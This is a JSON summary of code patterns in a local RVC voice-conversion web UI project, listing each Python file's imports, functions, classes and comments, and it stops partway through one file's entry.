[
  {
    "project": "/Users/davidquinton/Projects/RVC/rvc-webui",
    "name": "rvc-webui",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/automate_training_v4.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "from playwright.async_api import async_playwright"
        ],
        "comments": [
          "# Click Train tab",
          "# Gradio uses textareas for text inputs, find the experiment name field",
          "# Find experiment name textarea (first one, contains \"mi-test\" by default)",
          "# First textarea with short value or \"mi-test\" is experiment name",
          "# Also fill the dataset path (second textarea usually)",
          "# Now find and click buttons",
          "# Skip preprocessing and feature extraction - already done!",
          "# Click Train"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/automate_training.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "from playwright.async_api import async_playwright",
          "import time"
        ],
        "comments": [
          "# Launch browser (headless=False so you can see what's happening)",
          "# Wait for page to fully load",
          "# Click on the Train tab",
          "# Try clicking by tab index",
          "# Take a screenshot to see current state",
          "# Find experiment name input and fill it",
          "# Look for feature extraction button",
          "# Keep browser open for observation"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/automate_training_v2.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "from playwright.async_api import async_playwright",
          "import time"
        ],
        "comments": [
          "# Launch browser visible",
          "# Click Train tab (second tab usually)",
          "# Step 1: Enter experiment name",
          "# Find input near \"experiment name\" text",
          "# First input is usually experiment name",
          "# Find and fill dataset path (second input usually)",
          "# Step 2a: Click \"Process Data\" button",
          "# Step 2b: Click Feature Extraction",
          "# Step 3: Start Training",
          "# Keep browser open to monitor"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer-web.py",
        "docstrings": [],
        "function_defs": [
          "def forward_dml(ctx, x, scale):",
          "def __init__(self, **kwargs):",
          "def get_block_name(self):",
          "def lookup_indices(index_root):",
          "def change_choices():",
          "def clean():",
          "def export_onnx(ModelPath, ExportedPath):",
          "def if_done(done, p):",
          "def if_done_multi(done, ps):",
          "def preprocess_dataset(trainset_dir, exp_dir, sr, n_p):",
          "def extract_f0_feature(gpus, n_p, f0method, if_f0, exp_dir, version19, gpus_rmvpe):",
          "def get_pretrained_models(path_str, f0_str, sr2):",
          "def change_sr2(sr2, if_f0_3, version19):",
          "def change_version19(sr2, if_f0_3, version19):",
          "def change_f0(if_f0_3, sr2, version19):  # f0method8,pretrained_G14,pretrained_D15",
          "def click_train(",
          "def train_index(exp_dir1, version19):",
          "def train1key(",
          "def get_info_str(strr):",
          "def change_info_(ckpt_path):",
          "def change_f0_method(f0method8):"
        ],
        "class_defs": [
          "class ToolButton(gr.Button, gr.components.FormComponent):"
        ],
        "imports": [
          "import os",
          "import sys",
          "from dotenv import load_dotenv",
          "from infer.modules.vc.modules import VC",
          "from infer.modules.uvr5.modules import uvr",
          "from infer.lib.train.process_ckpt import (",
          "from i18n.i18n import I18nAuto",
          "from configs.config import Config",
          "from sklearn.cluster import MiniBatchKMeans",
          "import torch, platform",
          "import numpy as np",
          "import gradio as gr",
          "import faiss",
          "import fairseq",
          "import pathlib",
          "import json",
          "from time import sleep",
          "from subprocess import Popen",
          "from random import shuffle",
          "import warnings",
          "import traceback",
          "import threading",
          "import shutil",
          "import logging",
          "from infer.modules.onnx.export import export_onnx as eo"
        ],
        "comments": [
          "# \u5224\u65ad\u662f\u5426\u6709\u80fd\u7528\u6765\u8bad\u7ec3\u548c\u52a0\u901f\u63a8\u7406\u7684N\u5361",
          "# A10#A100#V100#A40#P40#M40#K80#A4500",
          "# poll==None\u4ee3\u8868\u8fdb\u7a0b\u672a\u7ed3\u675f",
          "# \u53ea\u8981\u6709\u4e00\u4e2a\u8fdb\u7a0b\u672a\u7ed3\u675f\u90fd\u4e0d\u505c",
          "# , stdin=PIPE, stdout=PIPE,stderr=PIPE,cwd=now_dir",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# but2.click(extract_f0,[gpus6,np7,f0method8,if_f0_3,trainset_dir4],[info2])",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# \u5bf9\u4e0d\u540cpart\u5206\u522b\u5f00\u591a\u8fdb\u7a0b",
          "# \u715e\u7b14gr, popen read\u90fd\u975e\u5f97\u5168\u8dd1\u5b8c\u4e86\u518d\u4e00\u6b21\u6027\u8bfb\u53d6, \u4e0d\u7528gr\u5c31\u6b63\u5e38\u8bfb\u4e00\u53e5\u8f93\u51fa\u4e00\u53e5;\u53ea\u80fd\u989d\u5916\u5f04\u51fa\u4e00\u4e2a\u6587\u672c\u6d41\u5b9a\u65f6\u8bfb",
          "# but3.click(click_train,[exp_dir1,sr2,if_f0_3,save_epoch10,total_epoch11,batch_size12,if_save_latest13,pretrained_G14,pretrained_D15,gpus16])",
          "# \u751f\u6210filelist",
          "# \u751f\u6210config#\u65e0\u9700\u751f\u6210config",
          "# cmd = python_cmd + \" train_nsf_sim_cache_sid_load_pretrain.py -e mi-test -sr 40k -f0 1 -bs 4 -g 0 -te 10 -se 5 -pg pretrained/f0G40k.pth -pd pretrained/f0D40k.pth -l 1 -c 0\"",
          "# but4.click(train_index, [exp_dir1], info3)",
          "# exp_dir = \"%s/logs/%s\" % (now_dir, exp_dir1)",
          "# index = faiss.index_factory(256if version19==\"v1\"else 768, \"IVF%s,PQ128x4fs,RFlat\"%n_ivf)",
          "# faiss.write_index(index, '%s/added_IVF%s_Flat_FastScan_%s.index'%(exp_dir,n_ivf,version19))",
          "# infos.append(\"\u6210\u529f\u6784\u5efa\u7d22\u5f15\uff0cadded_IVF%s_Flat_FastScan_%s.index\"%(n_ivf,version19))",
          "# but5.click(train1key, [exp_dir1, sr2, if_f0_3, trainset_dir4, spk_id5, gpus6, np7, f0method8, save_epoch10, total_epoch11, batch_size12, if_save_latest13, pretrained_G14, pretrained_D15, gpus16, if_cache_gpu17], info3)",
          "# step1:\u5904\u7406\u6570\u636e",
          "# step2a:\u63d0\u53d6\u97f3\u9ad8",
          "# step3a:\u8bad\u7ec3\u6a21\u578b",
          "# step3b:\u8bad\u7ec3\u7d22\u5f15",
          "#                    ckpt_path2.change(change_info_,[ckpt_path2],[sr__,if_f0__])",
          "# file_big_npy1 = gr.Textbox(",
          "#     label=i18n(\"\u7279\u5f81\u6587\u4ef6\u8def\u5f84\"),",
          "#     value=\"E:\\\\codes\\py39\\\\vits_vc_gpu_train\\\\logs\\\\mi-test-1key\\\\total_fea.npy\",",
          "#     interactive=True,",
          "# )",
          "# file_big_npy1,",
          "# file_big_npy2 = gr.Textbox(",
          "#     label=i18n(\"\u7279\u5f81\u6587\u4ef6\u8def\u5f84\"),",
          "#     value=\"E:\\\\codes\\\\py39\\\\vits_vc_gpu_train\\\\logs\\\\mi-test-1key\\\\total_fea.npy\",",
          "#     interactive=True,",
          "# )",
          "# file_big_npy2,"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/api_240604.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self) -> None:",
          "def __init__(self, inp_q, opt_q):",
          "def run(self):",
          "def __init__(self) -> None:",
          "def initialize_queues(self):",
          "def load(self):",
          "def set_values(self, values):",
          "def start_vc(self):",
          "def soundinput(self):",
          "def audio_callback(self, indata: np.ndarray, outdata: np.ndarray, frames, times, status):",
          "def get_devices(self, update: bool = True):",
          "def set_devices(self, input_device, output_device):",
          "def get_input_devices():",
          "def get_output_devices():",
          "def configure_audio(config_data: ConfigData):",
          "def start_conversion():",
          "def stop_conversion():"
        ],
        "class_defs": [
          "class GUIConfig:",
          "class ConfigData(BaseModel):",
          "class Harvest(Process):",
          "class AudioAPI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import re",
          "import time",
          "import librosa",
          "import torch",
          "import numpy as np",
          "import torch.nn.functional as F",
          "import torchaudio.transforms as tat",
          "import sounddevice as sd",
          "from dotenv import load_dotenv",
          "from fastapi import FastAPI, HTTPException",
          "from pydantic import BaseModel",
          "import threading",
          "import uvicorn",
          "import logging",
          "from multiprocessing import Queue, Process, cpu_count, freeze_support",
          "import numpy as np",
          "import pyworld",
          "from tools.torchgate import TorchGate",
          "import tools.rvc_for_realtime as rvc_for_realtime",
          "from configs.config import Config"
        ],
        "comments": [
          "#api for 240604 release version by Xiaokai",
          "# Initialize the logger",
          "# Define FastAPI app",
          "# input noise reduction and resampling",
          "# infer",
          "# output noise reduction",
          "# volume envelop mixing",
          "# SOLA algorithm from https://github.com/yxlllc/DDSP-SVC"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 26,
        "decorators": [
          "@app.get(\"/inputDevices\", response_model=list)",
          "@app.get(\"/outputDevices\", response_model=list)",
          "@app.post(\"/config\")",
          "@app.post(\"/start\")",
          "@app.post(\"/stop\")"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/gui_v1.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr, *args):",
          "def phase_vocoder(a, b, fade_out, fade_in):",
          "def __init__(self, inp_q, opt_q):",
          "def run(self):",
          "def __init__(self) -> None:",
          "def __init__(self) -> None:",
          "def load(self):",
          "def launcher(self):",
          "def event_handler(self):",
          "def set_values(self, values):",
          "def start_vc(self):",
          "def start_stream(self):",
          "def stop_stream(self):",
          "def audio_callback(",
          "def update_devices(self, hostapi_name=None):\n\"\"\"\u83b7\u53d6\u8bbe\u5907\u5217\u8868\"\"\"\nglobal flag_vc\nflag_vc = False\nsd._terminate()\nsd._initialize()\ndevices = sd.query_devices()\nhostapis = sd.query_hostapis()\nfor hostapi in hostapis:\nfor device_idx in hostapi[\"devices\"]:",
          "def set_devices(self, input_device, output_device):\n\"\"\"\u8bbe\u7f6e\u8f93\u51fa\u8bbe\u5907\"\"\"\nsd.default.device[0] = self.input_devices_indices[\nself.input_devices.index(input_device)\n]\nsd.default.device[1] = self.output_devices_indices[\nself.output_devices.index(output_device)\n]\nprintt(\"Input device: %s:%s\", str(sd.default.device[0]), input_device)\nprintt(\"Output device: %s:%s\", str(sd.default.device[1]), output_device)",
          "def get_device_samplerate(self):",
          "def get_device_channels(self):"
        ],
        "class_defs": [
          "class Harvest(multiprocessing.Process):",
          "class GUIConfig:",
          "class GUI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "from dotenv import load_dotenv",
          "import shutil",
          "import multiprocessing",
          "import numpy as np",
          "import pyworld",
          "import json",
          "import multiprocessing",
          "import re",
          "import threading",
          "import time",
          "import traceback",
          "from multiprocessing import Queue, cpu_count",
          "from queue import Empty",
          "import librosa",
          "from tools.torchgate import TorchGate",
          "import numpy as np",
          "import FreeSimpleGUI as sg",
          "import sounddevice as sd",
          "import torch",
          "import torch.nn.functional as F",
          "import torchaudio.transforms as tat",
          "from infer.lib import rtrvc as rvc_for_realtime",
          "from i18n.i18n import I18nAuto",
          "from configs.config import Config"
        ],
        "comments": [
          "# device = rvc_for_realtime.config.device",
          "# device = torch.device(",
          "#     \"cuda\"",
          "#     if torch.cuda.is_available()",
          "#     else (\"mps\" if torch.backends.mps.is_available() else \"cpu\")",
          "# )",
          "# [",
          "#     sg.Text(\"\u8bbe\u5907\u5ef6\u8fdf\"),",
          "#     sg.Slider(",
          "#         range=(0, 1),",
          "#         key=\"device_latency\",",
          "#         resolution=0.001,",
          "#         orientation=\"h\",",
          "#         default_value=data.get(\"device_latency\", 0.1),",
          "#         enable_events=True,",
          "#     ),",
          "# ],",
          "# sg.Checkbox(",
          "#     \"JIT\u52a0\u901f\",",
          "#     default=self.config.use_jit,",
          "#     key=\"use_jit\",",
          "#     enable_events=False,",
          "# ),",
          "# [sg.Text(\"\u6ce8\uff1a\u9996\u6b21\u4f7f\u7528JIT\u52a0\u901f\u65f6\uff0c\u4f1a\u51fa\u73b0\u5361\u987f\uff0c\\n      \u5e76\u4f34\u968f\u4e00\u4e9b\u566a\u97f3\uff0c\u4f46\u8fd9\u662f\u6b63\u5e38\u73b0\u8c61\uff01\")],",
          "# \"device_latency\": values[\"device_latency\"],",
          "# \"use_jit\": values[\"use_jit\"],",
          "# Parameter hot update",
          "# Other parameters do not support hot update",
          "# self.device_latency = values[\"device_latency\"]",
          "# input noise reduction and resampling",
          "# infer",
          "# output noise reduction",
          "# volume envelop mixing",
          "# SOLA algorithm from https://github.com/yxlllc/DDSP-SVC"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/api_231006.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self) -> None:",
          "def __init__(self) -> None:",
          "def load(self):",
          "def set_values(self, values):",
          "def start_vc(self):",
          "def soundinput(self):",
          "def audio_callback(self, indata: np.ndarray, outdata: np.ndarray, frames, times, status):",
          "def get_devices(self, update: bool = True):",
          "def set_devices(self, input_device, output_device):",
          "def get_input_devices():",
          "def get_output_devices():",
          "def configure_audio(config_data: ConfigData):",
          "def start_conversion():",
          "def stop_conversion():"
        ],
        "class_defs": [
          "class GUIConfig:",
          "class ConfigData(BaseModel):",
          "class AudioAPI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import re",
          "import time",
          "import librosa",
          "import torch",
          "import numpy as np",
          "import torch.nn.functional as F",
          "import torchaudio.transforms as tat",
          "import sounddevice as sd",
          "from dotenv import load_dotenv",
          "from fastapi import FastAPI, HTTPException",
          "from pydantic import BaseModel",
          "import threading",
          "import uvicorn",
          "import logging",
          "from multiprocessing import freeze_support",
          "from tools.torchgate import TorchGate",
          "import tools.rvc_for_realtime as rvc_for_realtime",
          "from configs.config import Config"
        ],
        "comments": [
          "#api for 231006 release version by Xiaokai",
          "# Initialize the logger",
          "# Define FastAPI app"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 26,
        "decorators": [
          "@app.get(\"/inputDevices\", response_model=list)",
          "@app.get(\"/outputDevices\", response_model=list)",
          "@app.post(\"/config\")",
          "@app.post(\"/start\")",
          "@app.post(\"/stop\")"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/automate_training_v3.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "from playwright.async_api import async_playwright"
        ],
        "comments": [
          "# Take initial screenshot",
          "# Find and click the Train tab",
          "# Now let's look at all visible inputs",
          "# Look for text containing \"experiment\"",
          "# Find input near this label",
          "# Look for any button with \"process\" or \"extract\" or \"feature\"",
          "# Keep browser open"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/extract_features_hf.py",
        "docstrings": [],
        "function_defs": [
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import numpy as np",
          "import torch",
          "import soundfile as sf",
          "from scipy import signal",
          "from tqdm import tqdm",
          "from pathlib import Path",
          "from transformers import HubertModel, Wav2Vec2Processor"
        ],
        "comments": [
          "# Load HuBERT from transformers",
          "# Use facebook/hubert-base-ls960",
          "# Process each wav file",
          "# Load audio with soundfile",
          "# Convert to mono if stereo",
          "# Resample to 16kHz if needed",
          "# Process through model",
          "# Save features"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/download_models.py",
        "docstrings": [],
        "function_defs": [
          "def dl_model(link, model_name, dir_name):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "from pathlib import Path",
          "import requests"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/onnx_inference_demo.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import soundfile",
          "from ..infer.lib.infer_pack.onnx_inference import OnnxRVC"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/rvc_for_realtime.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr, *args):",
          "def __init__(",
          "def forward_dml(ctx, x, scale):",
          "def set_default_model():",
          "def set_jit_model():",
          "def set_synthesizer():",
          "def change_key(self, new_key):",
          "def change_index_rate(self, new_index_rate):",
          "def get_f0_post(self, f0):",
          "def get_f0(self, x, f0_up_key, n_cpu, method=\"harvest\"):",
          "def get_f0_crepe(self, x, f0_up_key):",
          "def get_f0_rmvpe(self, x, f0_up_key):",
          "def get_f0_fcpe(self, x, f0_up_key):",
          "def infer("
        ],
        "class_defs": [
          "class RVC:"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "import pickle",
          "import sys",
          "import traceback",
          "from infer.lib import jit",
          "from infer.lib.jit.get_synthesizer import get_synthesizer",
          "from time import time as ttime",
          "import fairseq",
          "import faiss",
          "import numpy as np",
          "import parselmouth",
          "import pyworld",
          "import scipy.signal as signal",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torchcrepe",
          "from infer.lib.infer_pack.models import (",
          "from multiprocessing import Manager as M",
          "from configs.config import Config",
          "from infer.lib.rmvpe import RMVPE",
          "from torchfcpe import spawn_bundled_infer_model"
        ],
        "comments": [
          "# config = Config()",
          "# config.device=torch.device(\"cpu\")########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# config.is_half=False########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# global config",
          "# device=\"cpu\"########\u5f3a\u5236cpu\u6d4b\u8bd5",
          "# printt(\"using crepe,device:%s\"%self.device)",
          "# device=self.device if self.device.type!=\"privateuseone\" else \"cpu\",###crepe\u4e0d\u7528\u534a\u7cbe\u5ea6\u5168\u90e8\u662f\u5168\u7cbe\u5ea6\u6240\u4ee5\u4e0d\u6101###cpu\u5ef6\u8fdf\u9ad8\u5230\u6ca1\u6cd5\u7528"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/calc_rvc_model_similarity.py",
        "docstrings": [],
        "function_defs": [
          "def cal_cross_attn(to_q, to_k, to_v, rand_input):",
          "def model_hash(filename):",
          "def eval(model, n, input):",
          "def main(path, root):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import logging",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import hashlib"
        ],
        "comments": [
          "# This code references https://huggingface.co/JosephusCheung/ASimilarityCalculatior/blob/main/qwerty.py",
          "# Fill in the path of the model to be queried and the root directory of the reference models, and this script will return the similarity between the model to be queried and all reference models."
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/infer_batch_rvc.py",
        "docstrings": [],
        "function_defs": [
          "def arg_parse() -> tuple:",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import argparse",
          "import os",
          "import sys",
          "import sys",
          "import tqdm as tq",
          "from dotenv import load_dotenv",
          "from scipy.io import wavfile",
          "from configs.config import Config",
          "from infer.modules.vc.modules import VC"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/export_onnx.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import torch",
          "from infer.lib.infer_pack.models_onnx import SynthesizerTrnMsNSFsidM"
        ],
        "comments": [
          "# net_g.construct_spkmixmap(n_speaker) \u591a\u89d2\u8272\u6df7\u5408\u8f68\u9053\u5bfc\u51fa"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/app.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import logging",
          "import os",
          "import gradio as gr",
          "from dotenv import load_dotenv",
          "from configs.config import Config",
          "from i18n.i18n import I18nAuto",
          "from infer.modules.vc.modules import VC"
        ],
        "comments": [
          "# os.system(\"wget -P cvec/ https://huggingface.co/lj1995/VoiceConversionWebUI/resolve/main/hubert_base.pt\")",
          "# file_big_npy1,"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/tools/infer_cli.py",
        "docstrings": [],
        "function_defs": [
          "def arg_parse() -> tuple:",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import argparse",
          "import os",
          "import sys",
          "from dotenv import load_dotenv",
          "from scipy.io import wavfile",
          "from configs.config import Config",
          "from infer.modules.vc.modules import VC"
        ],
        "comments": [
          "####",
          "# USAGE",
          "#",
          "# In your Terminal or CMD or whatever"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/configs/config.py",
        "docstrings": [],
        "function_defs": [
          "def singleton_variable(func):",
          "def wrapper(*args, **kwargs):",
          "def __init__(self):",
          "def load_config_json() -> dict:",
          "def arg_parse() -> tuple:",
          "def has_mps() -> bool:",
          "def has_xpu() -> bool:",
          "def use_fp32_config(self):",
          "def device_config(self) -> tuple:"
        ],
        "class_defs": [
          "class Config:"
        ],
        "imports": [
          "import argparse",
          "import os",
          "import sys",
          "import json",
          "import shutil",
          "from multiprocessing import cpu_count",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from infer.modules.ipex import ipex_init",
          "import logging",
          "import torch_directml"
        ],
        "comments": [
          "# has_mps is only available in nightly pytorch (for now) and MasOS 12.3+.",
          "# check `getattr` and try it for compatibility",
          "# 6G\u663e\u5b58\u914d\u7f6e",
          "# 5G\u663e\u5b58\u914d\u7f6e",
          "# if self.device != \"cpu\":"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": [
          "@singleton_variable",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/i18n/scan_i18n.py",
        "docstrings": [],
        "function_defs": [
          "def extract_i18n_strings(node):"
        ],
        "class_defs": [],
        "imports": [
          "import ast",
          "import glob",
          "import json",
          "from collections import OrderedDict"
        ],
        "comments": [
          "# scan the directory for all .py files (recursively)",
          "# for each file, parse the code into an AST",
          "# for each AST, extract the i18n strings",
          "# Define the standard file name",
          "# write back"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/i18n/locale_diff.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "from collections import OrderedDict"
        ],
        "comments": [
          "# Define the standard file name",
          "# Find all JSON files in the directory",
          "# Load the standard file",
          "# Loop through each language file",
          "# Load the language file",
          "# Find the difference between the language file and the standard file",
          "# Add any missing keys to the language file",
          "# Del any extra keys to the language file",
          "# Sort the keys of the language file to match the order of the standard file",
          "# Save the updated language file"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/i18n/i18n.py",
        "docstrings": [],
        "function_defs": [
          "def load_language_list(language):",
          "def __init__(self, language=None):",
          "def __call__(self, key):",
          "def __repr__(self):"
        ],
        "class_defs": [
          "class I18nAuto:"
        ],
        "imports": [
          "import json",
          "import locale",
          "import os"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/slicer2.py",
        "docstrings": [],
        "function_defs": [
          "def get_rms(",
          "def __init__(",
          "def _apply_slice(self, waveform, begin, end):",
          "def slice(self, waveform):",
          "def main():"
        ],
        "class_defs": [
          "class Slicer:"
        ],
        "imports": [
          "import numpy as np",
          "import os.path",
          "from argparse import ArgumentParser",
          "import librosa",
          "import soundfile"
        ],
        "comments": [
          "# This function is obtained from librosa.",
          "# put our new within-frame axis at the end for now",
          "# Reduce the shape on the framing axis",
          "# Downsample along the target axis",
          "# Calculate power",
          "# @timeit",
          "# Keep looping while frame is silent.",
          "# Record start of silent frames.",
          "# Keep looping while frame is not silent and silence start has not been recorded.",
          "# Clear recorded silence start if interval is not enough or clip is too short",
          "# Need slicing. Record the range of silent frames to be removed.",
          "# Deal with trailing silence.",
          "# Apply and return slices."
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def transform(self, input_data, return_phase=False):\n\"\"\"Take input data (audio) to STFT domain.\n\nArguments:\ninput_data {tensor} -- Tensor of floats, with shape (num_batch, num_samples)\n\nReturns:\nmagnitude {tensor} -- Magnitude of STFT with shape (num_batch,\nnum_frequencies, num_frames)\nphase {tensor} -- Phase of STFT with shape (num_batch,",
          "def inverse(self, magnitude, phase):\n\"\"\"Call the inverse STFT (iSTFT), given magnitude and phase tensors produced\nby the ```transform``` function.\n\nArguments:\nmagnitude {tensor} -- Magnitude of STFT with shape (num_batch,\nnum_frequencies, num_frames)\nphase {tensor} -- Phase of STFT with shape (num_batch,\nnum_frequencies, num_frames)\n",
          "def forward(self, input_data):\n\"\"\"Take input data (audio) to STFT domain and then back to audio.\n\nArguments:\ninput_data {tensor} -- Tensor of floats, with shape (num_batch, num_samples)\n\nReturns:\nreconstruction {tensor} -- Reconstructed audio given magnitude and phase. Of\nshape (num_batch, num_samples)\n\"\"\"",
          "def __init__(self, input_features, hidden_features, num_layers):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, momentum=0.01):",
          "def forward(self, x: torch.Tensor):",
          "def __init__(",
          "def forward(self, x: torch.Tensor):",
          "def __init__(",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, n_inters, n_blocks, momentum=0.01):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, stride, n_blocks=1, momentum=0.01):",
          "def forward(self, x, concat_tensor):",
          "def __init__(self, in_channels, n_decoders, stride, n_blocks, momentum=0.01):",
          "def forward(self, x: torch.Tensor, concat_tensors: List[torch.Tensor]):",
          "def __init__(",
          "def forward(self, x: torch.Tensor) -> torch.Tensor:",
          "def __init__(",
          "def forward(self, mel):",
          "def __init__(",
          "def forward(self, audio, keyshift=0, speed=1, center=True):",
          "def __init__(self, model_path: str, is_half, device=None, use_jit=False):",
          "def get_jit_model():",
          "def get_default_model():",
          "def mel2hidden(self, mel):",
          "def decode(self, hidden, thred=0.03):",
          "def infer_from_audio(self, audio, thred=0.03):",
          "def to_local_average_cents(self, salience, thred=0.05):"
        ],
        "class_defs": [
          "class STFT(torch.nn.Module):",
          "class BiGRU(nn.Module):",
          "class ConvBlockRes(nn.Module):",
          "class Encoder(nn.Module):",
          "class ResEncoderBlock(nn.Module):",
          "class Intermediate(nn.Module):  #",
          "class ResDecoderBlock(nn.Module):",
          "class Decoder(nn.Module):",
          "class DeepUnet(nn.Module):",
          "class E2E(nn.Module):",
          "class MelSpectrogram(torch.nn.Module):",
          "class RMVPE:"
        ],
        "imports": [
